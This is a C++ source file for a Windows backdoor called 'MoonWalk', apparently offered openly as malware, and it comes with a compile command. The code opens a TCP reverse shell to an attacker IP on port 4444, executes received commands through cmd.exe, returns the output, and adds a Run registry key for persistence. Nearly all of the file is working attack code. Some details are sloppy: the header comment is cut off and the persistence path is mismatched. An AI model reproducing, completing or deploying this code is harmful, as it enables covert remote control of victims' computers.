// This payload is a malicious program that establishes a reverse shell to an attacker's machine, enabling them to remotely execute commands on the victim's system via cmd.exe. It communicates with the attacker's system using an unencrypted TCP connection. The shell receives commands, executes them, and sends the output back to the attacker. To ensure persistence, it modifies the Windows Registry under HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run, adding a key named MoonWalkBackdoor. This key points to a file path intended to make the payload launch automatically on user login. However, the path specified (C:\\Windows\\System32\\payload.dll).

// manual compile: x86_64-w64-mingw32-g++ -o payload MoonWalk.cpp -static -L/usr/lib/x86_64-linux-gnu -I/usr/include/crypto++ -lcryptopp -lws2_32 -mwindows

// Автор: S3N4T0R
// Дата: 2024-12-29

#include <winsock2.h>
#include <windows.h>
#include <cryptlib.h>
#include <aes.h>
#include <iostream>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <tchar.h>
#include <winreg.h>

#define PORT 4444
#define SERVER_IP "192.168.1.10" // Attacker's IP
#define BUFFER_SIZE 1024
#define PERSISTENCE_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define PERSISTENCE_VALUE "MoonWalkBackdoor"

SOCKET clientSocket;

void reverseShell(SOCKET clientSocket) {
    char buffer[BUFFER_SIZE];
    int bytesReceived;

    // Create a shell using cmd.exe
    FILE *fp = _popen("cmd.exe", "r");

    if (fp == NULL) {
        std::cerr << "Failed to open cmd.exe\n";
        return;
    }

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived == SOCKET_ERROR || bytesReceived == 0) {
            break; // Client disconnected or error occurred
        }

        // Execute command and send output back to the attacker
        std::string result = std::string(buffer);
        _pclose(fp);
        fp = _popen(result.c_str(), "r");
        
        // Sending back the result
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            send(clientSocket, buffer, strlen(buffer), 0);
        }
    }

    closesocket(clientSocket); // Correct function for closing socket in Windows
}

void createPersistenceWindows() {
    HKEY hKey;
    LPCSTR path = PERSISTENCE_KEY;
    LPCSTR valueName = PERSISTENCE_VALUE;

    // Open or create the registry key
    if (RegOpenKeyExA(HKEY_CURRENT_USER, path, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        // Set the registry value to ensure persistence
        RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)"C:\\Windows\\System32\\payload.dll", strlen("C:\\Windows\\System32\\ payload.dll"));
        RegCloseKey(hKey);
    }
}

void setupWinsock() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        exit(1);
    }
}

void connectToServer() {
    struct sockaddr_in server;
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        exit(1);
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(clientSocket, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        std::cerr << "Connection failed\n";
        exit(1);
    }
}

int main() {
    setupWinsock();
    connectToServer();
    createPersistenceWindows();
    reverseShell(clientSocket);
    WSACleanup();

    return 0;
}

